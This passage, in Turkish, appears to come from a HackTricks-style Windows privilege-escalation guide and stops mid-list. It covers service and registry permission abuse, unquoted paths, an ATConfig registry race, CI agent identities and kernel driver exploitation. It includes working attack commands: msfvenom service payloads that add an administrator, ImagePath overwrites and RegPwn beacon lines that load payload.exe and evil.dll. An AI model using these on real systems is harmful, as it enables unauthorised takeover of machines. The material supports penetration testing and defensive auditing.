2. `icacls <path>` ile binary dosyanın yazılabilir olduğunu doğrulayın.
3. Hizmet binary dosyasını bir payload veya geçerli bir kötü amaçlı hizmet binary dosyasıyla değiştirin.
4. `sc stop <service_name> && sc start <service_name>` ile hizmeti yeniden başlatın (veya yeniden başlatma / hizmet tetikleyicisi gerçekleşene kadar bekleyin).

Kullanışlı otomatik kontroller:<sup>[[28]](#references)</sup>

```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```

> Hizmet normal bir kullanıcının hizmeti yeniden başlatmasına izin vermiyorsa, açılışta otomatik olarak başlatılıp başlatılmadığını, yeniden başlatan bir hata eylemi olup olmadığını veya hizmeti kullanan uygulama tarafından dolaylı olarak tetiklenip tetiklenemediğini kontrol edin.

### Hizmet kayıt defteri üzerinde değişiklik izinleri

Herhangi bir hizmet kayıt defterini değiştirip değiştiremeyeceğinizi kontrol etmelisiniz.\
Bir hizmet kayıt defteri üzerindeki **izinlerinizi** şu şekilde **kontrol** edebilirsiniz:

```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```

Belirli bir hizmet anahtarında **Authenticated Users** veya **NT AUTHORITY\INTERACTIVE** için yazma yetkisi sağlayan kayıt defteri izinleri olup olmadığını inceleyin. Tek başına bir ACL girdisi, etkin erişimi kanıtlamaz: deny girdileri, geçerli token ve devralınan izinler önemlidir. Kayıt defteri anahtarı izinleri, hizmet nesnesinin `SERVICE_CHANGE_CONFIG` ve `SERVICE_START` izinlerinden ayrıdır. Yetki yükseltme için ayrıca kullanılabilir bir hizmet yapılandırma alanı, hizmeti tetikleme yöntemi ve daha ayrıcalıklı bir hizmet kimliği gerekir. Microsoft'un [registry-key rights](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights) ve [service access-rights reference](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) sayfalarına bakın.

Çalıştırılan binary'nin Path değerini değiştirmek için:

```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```

### Registry symlink race ile rastgele HKLM değer yazma (ATConfig)

Bazı Windows Erişilebilirlik özellikleri, daha sonra bir **SYSTEM** işlemi tarafından HKLM oturum anahtarına kopyalanan kullanıcı başına **ATConfig** anahtarları oluşturur. Bir registry **symbolic link race**, bu ayrıcalıklı yazma işlemini **herhangi bir HKLM yoluna** yönlendirerek rastgele bir HKLM **değer yazma** primitive'i sağlar.<sup>[[18]](#references)</sup>

Anahtar konumları (örnek: Ekran Klavyesi `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs`, yüklü erişilebilirlik özelliklerini listeler.
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>`, kullanıcı denetimindeki yapılandırmayı saklar.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>`, oturum açma/güvenli masaüstü geçişleri sırasında oluşturulur ve kullanıcı tarafından yazılabilir.

Kötüye kullanım akışı (CVE-2026-24291 / ATConfig):

1. SYSTEM tarafından yazılmasını istediğiniz değeri **HKCU ATConfig** içine yerleştirin.
2. Güvenli masaüstü kopyalama işlemini tetikleyin (ör. **LockWorkstation**); bu, AT broker akışını başlatır.
3. `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml` üzerinde bir **oplock** kurarak **yarışı kazanın**; oplock tetiklendiğinde **HKLM Session ATConfig** anahtarını, korumalı bir HKLM hedefine yönlendiren bir **registry link** ile değiştirin.
4. SYSTEM, saldırganın seçtiği değeri yönlendirilen HKLM yoluna yazar.

Rastgele HKLM değer yazma yeteneğini elde ettikten sonra, hizmet yapılandırma değerlerinin üzerine yazarak LPE'ye geçiş yapın:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/komut satırı)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Normal bir kullanıcının başlatabileceği bir hizmet seçin (ör. **`msiserver`**) ve yazma işleminden sonra hizmeti tetikleyin. **Not:** Herkese açık exploit uygulaması, race işleminin parçası olarak **iş istasyonunu kilitler**.

Örnek araçlar (RegPwn BOF / standalone):<sup>[[19]](#references)</sup>

```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```

### Services registry AppendData/AddSubdirectory permissions

Bir registry üzerinde bu izne sahipseniz, **bu registry altında alt registry'ler oluşturabilirsiniz**. Windows services söz konusu olduğunda bu, **arbitrary code çalıştırmak için yeterlidir:**

{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

Bir executable'ın path'i tırnak işaretleri içine alınmamışsa Windows, boşlukla biten her path'i çalıştırmayı dener.

Örneğin, _C:\Program Files\Some Folder\Service.exe_ path'i için Windows şunları çalıştırmayı dener:

```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```

Yerleşik Windows hizmetlerine ait olanları hariç tutarak tüm unquoted service paths'leri listeleyin:

```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
	for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
		echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
	)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```

**Bu zafiyeti** metasploit ile tespit edip exploit edebilirsiniz: `exploit/windows/local/trusted\_service\_path` Metasploit ile manuel olarak bir servis binary'si oluşturabilirsiniz:

```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```

### Kurtarma Eylemleri

Windows, bir hizmet başarısız olduğunda gerçekleştirilecek eylemleri kullanıcıların belirtmesine izin verir. Bu özellik, bir binary'yi işaret edecek şekilde yapılandırılabilir. Bu binary değiştirilebiliyorsa privilege escalation mümkün olabilir. Daha fazla ayrıntı [resmi belgelerde](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>) bulunabilir.

## Zamanlanmış görevlerin betik hedefleri

`.bat` veya `.cmd` dosyasıyla `cmd.exe /c` çalıştıran etkin bir görev için, `cmd.exe`'nin yanı sıra **eylem argümanlarında** belirtilen betiği de kontrol edin. Aynı durum, PowerShell `-File` gibi yorumlayıcının açık dosya argümanı için de geçerlidir. Zamanlanmış bir batch dosyasında doğrudan bir PowerShell `-File` çağrısı varsa, başvurulan betiğin ACL'sini de inceleyin; değişkenler, koşullu ifadeler ve shell zincirlemesi elle izlenmelidir. Çağıranın yazabildiği bir betik veya üst dizin, yalnızca yapılandırılmış görev sorumlusu çağırandan farklıysa ve görev gerçekten o eyleme ulaşıyorsa hesaplar arası yürütme için bir ipucudur. Yalnızca sona eklemeye izin veren bir ACL betikler açısından önemli olabilir, ancak daha önceki bir `exit` veya başka bir kontrol akışı eklenen satırların erişilemez olmasına yol açabilir. Privilege escalation olduğunu iddia etmeden önce etkin ACL'leri, [görev yürütme bağlamını](https://learn.microsoft.com/en-us/windows/win32/taskschd/security-contexts-for-running-tasks), çalışma dizinini, tetikleyiciyi ve uygulama denetimi politikasını doğrulayın. Envanter çıkarma sırasında betik değiştirilmemeli veya görev başlatılmamalıdır.

## Erişilebilir dosyalardaki adlandırılmış akışlar

NTFS'de okunabilir bir dosyanın, normal dizin listelemesinde görünmeyen içeriklere sahip adlandırılmış bir `:$DATA` akışı olabilir. Erişilebilir yedekleme veya yapılandırma dosyalarından oluşan küçük ve ilgili bir küme için, içerikleri açmadan önce akış **adlarını ve boyutlarını** inceleyin; Windows bunlara [`FindFirstStreamW` / `FindNextStreamW`](https://learn.microsoft.com/en-us/windows/win32/fileio/file-streams) ve PowerShell'in [`Get-Item -Stream *`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-item) komutuyla erişim sağlar. Gizli bilgiye işaret eden bir akış adı yalnızca bir ipucudur. Dosyanın etkin okuma izinlerini, dosya sisteminin akış desteğini, akışın kullanılabilir kimlik bilgileri içerip içermediğini ve bu kimlik bilgilerinin gerçekte hangi hesapla kimlik doğruladığını kontrol edin. Rutin envanter çıkarma sırasında özyinelemeli akış taramalarından ve akış içeriklerini yazdırmaktan kaçının.

## Zamanlanmış Windows Driver Kit yardımcı programı girdileri

İsteğe bağlı Windows Driver Kit, çalıştırıldığı dizinden `command.txt`, `reboot.rsf` ve proje `working\rsf.rsf` dosyasını kullanabilen `StandaloneRunner.exe` içerir. Ayrıcalıklı bir hesapla bu yardımcı programı başlatan zamanlanmış bir görev veya hizmet, yardımcı programın yürütülebilir dosyası korumalı olsa bile, bu girdilere düşük ayrıcalıklı yazma erişimini ilgili hesabın bağlamında komut yürütmeye dönüştürebilir. Ayrıcalıklı tüketiciyi ve **her iki** yan dosyanın oluşturulabildiğini veya değiştirilebildiğini doğrulayın; yalnızca yardımcı programı bulmak yeterli değildir.

Zamanlanmış bir görev için, eylemin [`WorkingDirectory`](https://learn.microsoft.com/en-us/windows/win32/taskschd/execaction-workingdirectory) değerini ve iki yan dosya yolunun ACL'lerini inceleyin. Görev bir çalışma dizini belirtmiyorsa, yürütülebilir dosyanın bulunduğu dizin doğrulanması gereken bir ipucudur; görevin girdilerini nereden okuduğunu kanıtlamaz. Projenin çalışma dosyası ön koşulu da karşılanmalıdır. Görevin SYSTEM olarak çalıştığını varsaymak yerine gerçek görev sorumlusunu kontrol edin.

## Uygulamalar

### Yüklü Uygulamalar

**Binary'lerin izinlerini** kontrol edin (birinin üzerine yazıp privilege escalation sağlayabilirsiniz) ve **klasörlerin** izinlerini de inceleyin ([DLL Hijacking](dll-hijacking/index.html)).

```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```

#### Checkmk Windows agent onarım yolu

[CVE-2024-0670](https://checkmk.com/werk/16361), `C:\Windows\Temp` konumunda komut dosyaları oluşturan ve değiştirme başarısız olduğunda önceden var olan, yazmaya karşı korumalı bir dosyayı çalıştıran eski Checkmk Windows agent sürümlerini etkiler. Üretici sorunu 2.1.0p40, 2.2.0p23, 2.3.0b1 ve 2.4.0b1 sürümlerinde düzeltti. Yüklü sürümün tam patch düzeyini ve etkilenen agent işleminin çalışıp çalışamayacağını kontrol edin; `2.1` gibi yalnızca dalı belirten bir etiket, sistemin etkilenip etkilenmediğini gösteremez. Sayım işlemi, dosya oluşturmadan veya agent komutlarını tetiklemeden sürümü, hizmet durumunu ve Temp izinlerini inceleyebilir.

#### ADSelfService Plus SAML hizmeti incelemesi

[CVE-2022-47966](https://www.manageengine.com/security/advisory/CVE/cve-2022-47966.html), ADSelfService Plus 6210 ve önceki build'leri etkiledi; üretici sorunu 6211 build'inde düzeltti. Bu sorun yalnızca SAML SSO **etkinse veya geçmişte etkin olmuşsa** önem taşır. Bu nedenle yüklü ürün kaydı veya hizmet yolu bir bulgudur, güvenlik açığı kararı değildir: tam build'i, SAML yapılandırma geçmişini, hizmete ağ üzerinden erişilebilirliği ve hizmetin hangi hesapla çalıştığını doğrulayın. Hizmet üzerinden kod yürütme, o hesabın ayrıcalıklarıyla gerçekleşir; SYSTEM olarak yürütme için örneğin SYSTEM hesabıyla çalışıyor olması gerekir. Ürünün Backup dizininde okunabilir bir `OfflineBackup_*.ezip` dosyası, ayrı bir şifreli yedekleme bulgusudur; kullanılabilir bir kimlik bilgisinin veya bu SAML açığının kanıtı değildir. Rutin sayım sırasında dosyayı açmadan yolunu ve erişim haklarını kaydedin.

#### Jenkins controller ve domain hesabı sınırları

Bir Windows Jenkins controller'da iş oluşturma veya yapılandırma iznini işi başlatma izninden ayırın: [Jenkins bunları ayrı `Job/Create`, `Job/Configure` ve `Job/Build` izinleri olarak belgeler](https://www.jenkins.io/doc/book/security/access-control/permissions/). Yapılandırılmış bir zamanlama veya uzaktan tetikleyici başka bir build yolu sağlayabilir; ancak bunun etkin olduğunu ve build'in gerçekten çalıştığını doğrulayın. Yürütme, controller'ın veya seçili agent'ın kimliğiyle gerçekleşir ve kayıtlı bir kimlik bilgisi yalnızca işin erişebildiği kapsamda kullanılabilir. Ayrıca `JENKINS_HOME` metadata'sına erişimi inceleyin: Jenkins, kimlik bilgisi materyalini ve şifreleme anahtarlarını `credentials.xml`, `secrets/hudson.util.Secret` ve `secrets/master.key` dosyalarında tutar ([Jenkins gizli bilgi depolama](https://www.jenkins.io/doc/developer/security/secrets/)). Bu dosyaların varlığı tek başına bir parolayı açığa çıkarmaz; **gerekli dosyalara okuma erişimini** ve farklı bir hesap yeniden kullanım yolunu, paylaşılan çıktılara gizli bilgileri yazdırmadan doğrulayın. Bu hesabın bir AD user-object `scriptPath` yazma izni varsa, bunu kullanıcılar arası yürütme olarak değerlendirmeden önce yazılabilir bir script path bulunduğunu ve hedef kullanıcı olarak çalışan gerçek bir oturum açma veya zamanlanmış tüketici olduğunu doğrulayın. Ek grup denetimi için etkin AD hakları ayrıca doğrulanmalıdır.

#### Azure Pipelines self-hosted agent kimliği

Azure DevOps Server veya Azure Pipelines projesinde, pipeline **oluşturma veya düzenleme** iznini pipeline'ı **kuyruğa alma** ve seçili agent pool'u kullanma izninden ayırın; [Microsoft pipeline izinlerini](https://learn.microsoft.com/en-us/azure/devops/pipelines/policies/permissions?view=azure-devops) ve [pool yetkilendirmesini](https://learn.microsoft.com/en-us/azure/devops/pipelines/agents/pools-queues?view=azure-devops) ayrı ayrı belgeler. Daha düşük ayrıcalıklı bir hesap script adımı gönderebiliyor ve bu pipeline'ı self-hosted Windows agent'ta çalıştırabiliyorsa, adım [agent'ın yapılandırılmış işletim sistemi hesabıyla](https://learn.microsoft.com/azure/devops/pipelines/agents/agents) yürütülür. Kullanıcılar arası veya SYSTEM düzeyinde geçiş iddiasında bulunmadan önce belirli pipeline'ı, branch/resource kısıtlamalarını, yetkilendirilmiş pool'u, çalıştırılabilir işi ve agent hizmet kimliğini doğrulayın. Yüklü bir agent, proje rolü veya repository yazma izni tek başına yalnızca bir bulgudur; pasif sayım sırasında build başlatmadan izinleri ve yerel hizmet metadata'sını inceleyin.

#### Microsoft Entra Connect Sync kimlik bilgileri

[Microsoft,](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/reference-connect-accounts-permissions) eşitleme hizmetini çalıştıran ve SQL veritabanına erişen **ADSync hizmet hesabı** ile dizin izinleri yapılandırılmış eşitleme özelliklerine bağlı olan **AD DS connector hesabı** arasında ayrım yapar. Connector kimlik bilgileri bu veritabanında şifrelenmiş olarak saklanır; anahtar materyali ise [ADSync hizmet hesabı altında DPAPI ile korunur](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/concept-adsync-service-account). Yüklü bir eşitleme hizmeti, yerel yönetici izlenimi veren bir grup veya yalnızca veritabanının görünür olması, çözülebilir bir kimlik bilgisini ya da domain ayrıcalık yükseltmesini kanıtlamaz. Gerçek veritabanı okuma haklarını, hizmet hesabı/anahtar erişimini, kurulum ve SQL yerleşimini, yapılandırılmış connector kimliğini ve bu kimliğin etkin AD ayrıcalıklarını ayrı ayrı inceleyin. Rutin sayım yalnızca hizmet ve erişim metadata'sını göstermeli, kayıtlı gizli bilgileri sorgulamamalı veya yazdırmamalıdır.

#### Printer driver destek DLL izinleri

Yüklü bir printer driver, destek DLL'lerini `C:\ProgramData` altında tutabilir ve bunları daha ayrıcalıklı bir print process içinde yükleyebilir. Printer WMI sayımına izin verilmese bile üst dizinleri ve reparse point'leri de içerecek şekilde ilgili driver dizininin ve DLL ACL'lerini inceleyin. [Ricoh printer-driver sorunu CVE-2019-19363](https://www.ricoh.com/info/2020/0122_1) için bildirilen yol `C:\ProgramData\RICOH_DRV\<driver>\_common\dlz` idi; [orijinal açıklamada](https://www.pentagrid.ch/de/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/) DLL'lerin `PrintIsolationHost.exe` tarafından yüklendiği anlatılır. Yazılabilir bir ACL yalnızca bir bulgudur: deny girdileri uygulandıktan sonra etkin yazma erişimini, ilgili driver'ın yüklü olup olmadığını ve dosyayı ayrıcalıklı bir kimlikle yükleyip yüklemediğini, ayrıca üreticinin güncellenmiş driver'ının veya güvenlik programının kurulumu düzeltip düzeltmediğini doğrulayın. Yalnızca dizin adına veya driver sürümüne bakarak güvenlik açığı olduğu sonucuna varmayın.

### Yazma İzinleri

Özel dosyaları okuyabilmek için herhangi bir yapılandırma dosyasını değiştirip değiştiremeyeceğinizi veya bir Administrator hesabı tarafından çalıştırılacak herhangi bir binary'yi (schedtasks) değiştirip değiştiremeyeceğinizi kontrol edin.

Sistemdeki zayıf klasör/dosya izinlerini bulmanın bir yolu şudur:

```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```

### Notepad++ eklentisinin otomatik yüklenmesiyle kalıcılık/çalıştırma

Notepad++، `plugins` alt klasörlerindeki tüm eklenti DLL'lerini otomatik olarak yükler. Yazılabilir, taşınabilir/kopya bir kurulum varsa kötü amaçlı bir eklenti bırakmak, her başlatmada (`DllMain` ve eklenti geri çağırmaları dahil) `notepad++.exe` içinde otomatik kod yürütülmesini sağlar.

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Başlangıçta çalıştırma

**Farklı bir kullanıcı tarafından yürütülecek bir kayıt defteri girdisinin veya ikili dosyanın üzerine yazıp yazamayacağınızı kontrol edin.**\
**Yetkileri yükseltmek için ilgi çekici autoruns konumları** hakkında daha fazla bilgi edinmek için **aşağıdaki sayfayı** **okuyun**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Sürücüler

Olası **üçüncü taraf şüpheli/açıklara sahip** sürücüleri arayın

```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```

Bir driver keyfi kernel read/write primitive sunuyorsa (kötü tasarlanmış IOCTL handler'larında yaygın), kernel memory'den doğrudan bir SYSTEM token çalarak yetki yükseltebilirsiniz.<sup>[[13]](#references)</sup> Adım adım tekniği burada görebilirsiniz:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

{{#ref}}
windows-kernel-rootkits-and-dkom.md
{{#endref}}

Savunmasız çağrının saldırganın kontrolündeki bir Object Manager path'ini açtığı race-condition bug'larında, aramayı bilerek yavaşlatmak (max-length bileşenler veya derin directory zincirleri kullanarak) zaman aralığını mikrosaniyelerden onlarca mikrosaniyeye çıkarabilir:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

{{#ref}}
../../binary-exploitation/windows-kernel-exploitation/afd-rio-buffer-uaf.md
{{#endref}}

#### Cancel-safe queue UAF'leri, paged-pool disclosure'ları ve I/O ring pivot'ları

Bazı Windows kernel LPE zincirleri, tek başlarına zayıf olan iki bug'dan oluşturulabilir: queue lock hâlâ tutuluyorken bir request/CBD'yi serbest bırakan **cancel-safe queue lifetime race** ve `RtlCopyToUser` sırasında serbest bırakılmış bir paged-pool allocation'ı sızdıran **lock-release-before-copy** disclosure'u.<sup>[[29]](#references)</sup>

Denetim ve exploitation notları:

- **Lock altındayken serbest bırakma + sonrasında cancel**: success path'in **Acquire -> CompleteRequest/free -> Release**, cancel path'in ise **Acquire -> RemoveIo(stale pointer) -> Release -> CompleteCanceledIo** yaptığı durumları arayın. Success path, CBDQ/CSQ lock'unu bırakmadan önce `FltCompletePendedPreOperation` / `FltpFreeIrpCtrl`'a ulaşırsa, `NtCancelIoFileEx -> IopCsqCancelRoutine` içinde bekleyen bir thread daha sonra devam edip serbest bırakılmış bir `PFLT_CALLBACK_DATA`'yı driver'ın remove callback'ine aktarabilir.
- Serbest bırakılmış queue object'ini aynı boyutta, saldırganın kontrolündeki bir paged-pool allocation'ıyla **yeniden tahsis edin**. `NPFS` Data Queue Entries kullanışlıdır; çünkü payload ve boyutları kontrol edilebilir, ayrıca daha sonra pipe read/peek işlemleriyle incelenebilirler. Serbest bırakılmış object list link'leri içeriyorsa, bunların üzerine **user memory'de bulunan sahte request node'larından oluşan döngüsel bir liste** yazın. Böylece driver, orijinal list head'inde durmak yerine saldırganın tanımladığı request structure'larını tekrar tekrar işler.
- **Öngörülebilir bir write'ı güçlendirin**: Sahte request, bookkeeping write'larında kullanılan iç içe bir context pointer'ını (timestamps / QPC / refcount-adjacent fields) yönlendiriyorsa, **adresi kontrol edilebilen ancak değeri kontrol edilemeyen** bir kernel write elde edebilirsiniz. Bu durumda, son bir code/data pointer'ı yerine spray edilen bir pool object'in **length/size** field'ını hedefleyin ve ardından bozulmuş object'in **out-of-bounds paged-pool read** sağlamasını bekleyerek spray'i tarayın.
- **Raceable disclosure pattern**: `ptr = obj->Buffer; unlock(obj); RtlCopyToUser(dst, ptr, size)` yapan her syscall güçlü bir adaydır. Saldırganın kopyalanan buffer'ı büyütebilmesi güvenilirliği artırır (örneğin serializer'ın son allocation boyutunu artıran çok sayıda list/resource entry ekleyerek); çünkü daha uzun bir kopyalama, makinenin çökmesine neden olmadan replacement window'u genişletir.
- **Pointer bakımından zengin refill hedefleri**: Windows **I/O ring** registered-buffer array'leri, paged-pool boyutları saldırgan tarafından kontrol edilebildiğinden (`8 * regBufferCnt`) ve her eleman bir `_IOP_MC_BUFFER_ENTRY`'ye giden kernel pointer'ı olduğundan mükemmel disclosure hedefleridir. Bu array'lerden birini leak edin, çevresindeki `IORING_OBJECT`'i bulun, ardından **`RegBuffers`** ve **`RegBuffersCount`** değerlerini bozun. Böylece sonraki I/O ring işlemleri saldırganın oluşturduğu entry'leri kullanır ve keyfi kernel read/write sağlar. Kullanılabilir tek write size sabit bir byte sağlıyorsa (örneğin `KUSER_SHARED_DATA+0x14` değerinden), `0x0101010101010101` gibi tekrarlanan byte'lardan oluşan bir user pointer oluşturmak için **çakışan hizasız write'lar** kullanın, bunu `VirtualAlloc` ile map edin ve sahte registered-buffer array'ini buraya yerleştirin.<sup>[[30]](#references)</sup>

Yararlı debugging göstergeleri:

```text
NtCancelIoFileEx -> IopCsqCancelRoutine -> <driver>!RemoveIo
<driver> success path: Acquire -> CompleteRequest/free -> Release
RtlCopyToUser after releasing the object lock
ExAllocatePool2(..., 8 * regBufferCnt, 'BRrI')-style variable-sized pointer arrays
```

Corrupted I/O ring'den arbitrary kernel read/write elde ettikten sonra, standart post-primitive workflow'u kullanarak bir SYSTEM token çalın:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Registry hive memory corruption primitives

Modern hive zafiyetleri deterministik layout'lar oluşturmanıza, yazılabilir HKLM/HKU alt anahtarlarını kötüye kullanmanıza ve metadata corruption'ı özel bir driver olmadan kernel paged-pool overflow'larına dönüştürmenize olanak tanır. Zincirin tamamını burada öğrenin:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Saldırgan kontrollü path'lerden kaynaklanan `RtlQueryRegistryValues` direct-mode type confusion

Bazı driver'lar userland'den bir registry path kabul eder, yalnızca bunun geçerli bir UTF-16 string olduğunu doğrular ve ardından `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` çağrısını `RTL_QUERY_REGISTRY_DIRECT` ile `int readValue` gibi bir stack scalar'a yapar. `RTL_QUERY_REGISTRY_TYPECHECK` yoksa `EntryContext`, geliştiricinin beklediği türe göre değil, registry'deki **gerçek** türe göre yorumlanır.

Bu, iki kullanışlı primitive sağlar:<sup>[[24]](#references)[[25]](#references)</sup>

- **Confused deputy / oracle**: Kullanıcı kontrollü mutlak bir `\Registry\...` path'i, driver'ın saldırganın seçtiği anahtarları sorgulamasına, return code/log'lar üzerinden anahtarların varlığını leak etmesine ve bazen çağıranın doğrudan erişemediği değerleri okumasına olanak tanır.
- **Kernel memory corruption**: `&readValue` gibi bir scalar hedef, registry value türüne bağlı olarak `REG_QWORD`, `UNICODE_STRING` veya boyutlandırılmış bir binary buffer olarak type confusion'a uğrar.

Pratik exploitation notları:

- **Windows 8+ mitigation**: Sorgu, `RTL_QUERY_REGISTRY_TYPECHECK` olmadan `RTL_QUERY_REGISTRY_DIRECT` kullanarak **untrusted hive**'a erişirse kernel caller'lar `KERNEL_SECURITY_CHECK_FAILURE (0x139)` ile crash olur. Exploit edilebilirliği korumak için değerleri `HKCU` altında hazırlamak yerine **trusted system hive'lar içindeki saldırgan tarafından yazılabilir anahtarları** arayın.
- **Trusted-hive staging**: `\Registry\Machine` altındaki yazılabilir alt anahtarları listelemek için NtObjectManager'ı kullanın ve sandbox'lı bağlamlardan erişilebilen anahtarları bulmak için taramayı çoğaltılmış bir **low-integrity** token ile yeniden çalıştırın:<sup>[[26]](#references)</sup>

```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```

- **`REG_QWORD`**: 4-byte bir `int` içine yapılan 8-byte doğrudan yazma, bitişik stack verilerini bozar ve yakındaki bir callback/function pointer'ı kısmen üzerine yazabilir.
- **`REG_SZ` / `REG_EXPAND_SZ`**: direct mode, `EntryContext`'in bir `UNICODE_STRING`'i göstermesini bekler. Kod önce saldırganın kontrolündeki bir `REG_DWORD`'u stack scalar'a yükleyip ardından aynı buffer'ı string okuması için yeniden kullanırsa saldırgan `Length`/`MaximumLength` değerlerini kontrol eder ve `Buffer` pointer'ını kısmen etkiler; bunun sonucunda kısmen kontrol edilebilir bir kernel write elde edilir.
- **`REG_BINARY`**: Büyük binary verilerde direct mode, `EntryContext`'teki ilk `LONG` değerini signed buffer size olarak ele alır. Önceki bir `REG_DWORD` okuması, yeniden kullanılan scalar'da saldırganın kontrolündeki **negatif** bir değer bırakırsa sonraki `REG_BINARY` sorgusu saldırganın byte'larını doğrudan bitişik stack slotlarının üzerine kopyalar. Bu genellikle callback-pointer'ı tamamen üzerine yazmanın en kolay yoludur.

Güçlü bir hunting pattern: **aynı stack variable'a, yeniden başlatmadan, farklı türlerde registry read yapılması**. `RTL_REGISTRY_ABSOLUTE`, `RTL_QUERY_REGISTRY_DIRECT`, yeniden kullanılan `EntryContext` pointer'ları ve ilk registry read'in ikinci read'in gerçekleşip gerçekleşmeyeceğini kontrol ettiği code path'ler için Grep kullanın.

#### Device object'lerde FILE_DEVICE_SECURE_OPEN eksikliğini kötüye kullanma (LPE + EDR kill)

Bazı imzalı üçüncü taraf driver'lar `IoCreateDeviceSecure` kullanarak güçlü bir SDDL ile device object oluşturur, ancak `DeviceCharacteristics` içinde `FILE_DEVICE_SECURE_OPEN` ayarlamayı unutur. Bu flag olmadan device, fazladan bir bileşen içeren bir path üzerinden açıldığında secure DACL uygulanmaz. Böylece ayrıcalıksız herhangi bir kullanıcı, aşağıdaki gibi bir namespace path kullanarak handle elde edebilir:<sup>[[14]](#references)</sup>

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (gerçek dünyadan bir örnek)

Kullanıcı device'ı açabildiğinde, driver'ın sunduğu ayrıcalıklı IOCTL'ler LPE ve tampering için kötüye kullanılabilir. Gerçek ortamlarda gözlemlenen örnek yetenekler:
